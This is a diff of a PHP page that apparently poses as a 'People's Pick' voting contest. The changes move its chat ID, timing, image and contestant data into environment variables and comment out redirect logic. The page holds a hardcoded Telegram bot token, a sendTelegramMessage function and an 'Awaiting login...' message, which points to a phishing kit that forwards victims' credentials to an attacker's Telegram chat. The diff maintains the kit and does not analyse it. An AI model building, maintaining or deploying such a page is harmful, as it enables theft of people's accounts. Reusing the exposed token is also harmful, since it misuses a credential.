@@ -24,32 +24,41 @@ $appEnv = env('APP_ENV', 'production');
 
 
 // Redirect prevention logic
-if (!isset($_GET['t']) && !isset($_GET['r'])) {
-    $originalUrl = '.php';
-    $uniqueQueryString = 't=' . time();
+// if (!isset($_GET['t']) && !isset($_GET['r'])) {
+//     $originalUrl = '.php';
+//     $uniqueQueryString = 't=' . time();
     
-    $newUrl = strpos($originalUrl, '?') === false 
-        ? $originalUrl . '?' . $uniqueQueryString 
-        : $originalUrl . '&' . $uniqueQueryString;
+//     $newUrl = strpos($originalUrl, '?') === false 
+//         ? $originalUrl . '?' . $uniqueQueryString 
+//         : $originalUrl . '&' . $uniqueQueryString;
     
-    header('Location: ' . $newUrl);
-    exit();
-}
+//     header('Location: ' . $newUrl);
+//     exit();
+// }
 
 // Load configurations
-$setDate = new DateTime(file_get_contents('time.txt'));
+$setDate = new DateTime(env('TIME', ''));
 $currentTime = new DateTime('now');
-$chatId = file_get_contents('telegram_chat_id.txt');
+$chatId = env('TELEGRAM_CHAT_ID', '');
 $botToken = '8068607725:AAE3V6JSAcPJuXuo15PGnQakZ0VV3WmXHKY';
 
 // Load image configuration
-$imageConfig = include('image_config.php');
-$mainImage = $imageConfig['main_image'];
+// $imageConfig = include('image_config.php');
+// $mainImage = $imageConfig['main_image'];
+
+$dataImage = json_decode(env('IMAGE_DATA', '{}'), true);
+$mainImage = $dataImage['main_image'];
 
 // Load contestant configuration
-$contestantsData = include('contestant_config.php');
-$mainContestant = $contestantsData['main_contestant'];
-$otherContestants = $contestantsData['contestants'];
+// $contestantsData = include('contestant_config.php');
+// $mainContestant = $contestantsData['main_contestant'];
+// $otherContestants = $contestantsData['contestants'];
+
+$json = env('CONTEST_DATA', '{}');
+$data = json_decode($json, true);
+$mainContestant = $data['main_contestant'];
+$otherContestants = $data['contestants'];
+
 
 // Telegram message function
 function sendTelegramMessage($botToken, $chatId, $message) {
@@ -295,7 +304,7 @@ Awaiting login...");
             <div class="relative">
                 <img src="<?php echo $mainImage; ?>" alt="Main Image" class="w-full h-48 object-cover">
                 <div class="absolute bottom-0 left-0 right-0 bg-gradient-to-t from-black/70 to-transparent p-4">
-                    <h1 class="text-white text-2xl font-bold"><?php echo env('APP_NAME'); ?></h1>
+                    <h1 class="text-white text-2xl font-bold">THE PEOPLE'S PICK</h1>
                 </div>
             </div>
             <div class="p-6">
